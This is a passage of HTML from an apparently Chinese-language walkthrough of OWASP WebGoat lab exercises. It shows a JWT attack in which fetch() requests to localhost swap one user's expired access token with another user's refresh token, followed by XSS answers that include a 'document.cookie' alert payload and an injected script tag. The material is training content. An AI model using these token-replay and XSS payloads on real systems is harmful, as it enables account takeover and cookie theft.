class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;POST&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;result&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>伺服器會回應一組帶有 <code>access_token</code> 和 <code>refresh_token</code> 的物件：</p><div class=\"language-json codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-json codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;access_token&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;refresh_token&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;BByHeYWGAPOzYpZAEmcm&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>在 Logfile 中會看到一組 Tom 過期的 Token：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/m7Qfl8r.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>現在有 Tom 的 access_token 和 Jerry 的 refresh_token 後，Hint 中有提供 refresh token 的 endpoint <code>&#x27;jwt/refresh/newToken&#x27;</code>，因此可以使用它來更新 Tom 的 access_token：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 使用 Tom 的 access_token 和 Jerry 的 refresh_token 來更新 Tom 的 access_token</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">fetch</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;http://localhost:8080/WebGoat/JWT/refresh/newToken&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">headers</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token string-property property\">&#x27;Content-Type&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;application/json; charset=UTF-8&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// Tom 的 access_token</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">Authorization</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">      </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">body</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token known-class-name class-name\" style=\"color:rgb(255, 203, 107)\">JSON</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">stringify</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// Jerry 的 refresh_token</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">    </span><span class=\"token literal-property property\">refresh_token</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;BByHeYWGAPOzYpZAEmcm&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">method</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;POST&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token console class-name\" style=\"color:rgb(255, 203, 107)\">console</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">log</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;result&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> result</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>送出請求後即可得到 Tom 新的 <code>access_token</code> 和 <code>refresh_token</code>：</p><div class=\"language-json codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-json codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// Tom 新的 access_token 和 refresh_token</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;access_token&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;refresh_token&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;XYPYvWGFJQbGPvPMPXfZ&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>接著利用 OWASP 在送出 checkout 的請求時，在 request <code>headers</code> 中加入 Tom 的 access_token：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/bqa96hu.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>即可完成。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q8-未解\">Q8 未解<a href=\"#q8-未解\" class=\"hash-link\" aria-label=\"Q8 未解的直接連結\" title=\"Q8 未解的直接連結\">​</a></h4><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"password-reset未解\">Password reset（未解）<a href=\"#password-reset未解\" class=\"hash-link\" aria-label=\"Password reset（未解）的直接連結\" title=\"Password reset（未解）的直接連結\">​</a></h3><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cross-site-scriptingxss\">Cross-Site Scripting(XSS)<a href=\"#cross-site-scriptingxss\" class=\"hash-link\" aria-label=\"Cross-Site Scripting(XSS)的直接連結\" title=\"Cross-Site Scripting(XSS)的直接連結\">​</a></h2><blockquote><p>參考：<a href=\"https://klarsen.net/infosec/owasp-webgoat-xss-lessons/\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP WEBGOAT XSS LESSONS</a> @ klarsen.net</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cross-site-scripting\">Cross Site Scripting<a href=\"#cross-site-scripting\" class=\"hash-link\" aria-label=\"Cross Site Scripting的直接連結\" title=\"Cross Site Scripting的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-2\">Q2<a href=\"#q2-2\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>直接在網址列輸入 <code>javascript:alert(document.cookie);</code> 即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/hnfjhRF.png\" alt=\"imgur\" class=\"img_ev3q\"></p><blockquote><p>如果用複製貼上的話，瀏覽器可能會自動把 <code>javascript:</code> 的文字給過濾掉，需要自己補上。</p></blockquote><p>答案是 <code>Yes</code>。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q7-2\">Q7<a href=\"#q7-2\" class=\"hash-link\" aria-label=\"Q7的直接連結\" title=\"Q7的直接連結\">​</a></h4><p>在 credit card number 的欄位內貼上 <code>&lt;script&gt;alert(&#x27;my javascript here&#x27;)&lt;/script&gt;</code> 後按下送出即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/VUzZ4js.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q10\">Q10<a href=\"#q10\" class=\"hash-link\" aria-label=\"Q10的直接連結\" title=\"Q10的直接連結\">​</a></h4><p>在 <a href=\"../../../github.com/WebGoat/WebGoat/blob/4d7d0058c3ba0b4e542ed7e964ee1056207b7a08/webgoat-container/src/main/resources/static/js/goatApp/view/GoatRouter.html\" target=\"_blank\" rel=\"noopener noreferrer\">GoatRouter.js</a> 這支檔案中可以看到原始碼，裡面可以看到定義好的路由：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// src/main/resources/static/js/goatApp/view/GoatRouter.js</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token literal-property property\">routes</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token string-property property\">&#x27;welcome&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;welcomeRoute&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token string-property property\">&#x27;lesson/:name&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;lessonRoute&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token string-property property\">&#x27;lesson/:name/:pageNum&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;lessonPageRoute&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token string-property property\">&#x27;test/:param&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;testRoute&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token string-property property\">&#x27;reportCard&#x27;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;reportCard&#x27;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>其中可以讓我們帶入參數的路由包含 <code>lesson/:name</code>, <code>lesson/:name/:pageNum</code>, <code>test/:param</code>，往下看到 <code>testRouter</code> 的地方可以看到它會把傳入的參數放到 <code>lessonController.testHandler</code> 中：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// src/main/resources/static/js/goatApp/view/GoatRouter.js</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token function-variable function\" style=\"color:rgb(130, 170, 255)\">testRoute</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">function</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">param</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">this</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">lessonController</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">testHandler</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">param</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">//this.menuController.updateMenu(name);</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>於是切換到 <a href=\"../../../github.com/WebGoat/WebGoat/blob/4d7d0058c3ba0b4e542ed7e964ee1056207b7a08/webgoat-container/src/main/resources/static/js/goatApp/controller/LessonController.html\" target=\"_blank\" rel=\"noopener noreferrer\">LessonController.js</a> 這支檔案，搜尋 <code>testHandler</code>，可以看到傳入的參數會再被丟到 <code>lessonContentView</code>：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// src/main/resources/static/js/goatApp/controller/LessonController.js</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">this</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method-variable function-variable method function property-access\" style=\"color:rgb(130, 170, 255)\">testHandler</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">function</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">param</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 